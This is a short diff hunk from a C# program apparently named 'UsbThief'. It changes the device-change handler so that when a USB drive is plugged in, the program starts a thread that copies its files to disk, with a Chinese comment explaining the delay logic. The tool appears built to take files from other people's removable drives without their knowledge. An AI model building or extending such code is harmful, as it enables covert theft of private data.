@@ -234,13 +234,17 @@ namespace UsbThief
         {
             try
             {
-                if (m.Msg == WM_DEVICECHANGE && !noSpace && conf.enable && !inDelay)//不这么做的话，如果上一个设备(A)在延迟期间拔出，再插入新设备(B)，B的延迟结束后就会尝试同时从A和B两个设备复制文件。在延迟期间不识别新设备以避免此问题发生。
+                if (m.Msg == WM_DEVICECHANGE && conf.enable)//不这么做的话，如果上一个设备(A)在延迟期间拔出，再插入新设备(B)，B的延迟结束后就会尝试同时从A和B两个设备复制文件。在延迟期间不识别新设备以避免此问题发生。
                 {
                     int wp = m.WParam.ToInt32();
                     if (wp == DBT_DEVICEARRIVAL || wp == DBT_DEVICEQUERYREMOVE || wp == DBT_DEVICEREMOVECOMPLETE || wp == DBT_DEVICEREMOVEPENDING)
                     {
                         if (wp == DBT_DEVICEARRIVAL)
                         {
+                            if (noSpace || inDelay)
+                            {
+                                return;
+                            }
                             Thread copyT = new Thread(new ParameterizedThreadStart(Copy2Disk));
                             DriveInfo[] s = DriveInfo.GetDrives();
                             foreach (DriveInfo drive in s)
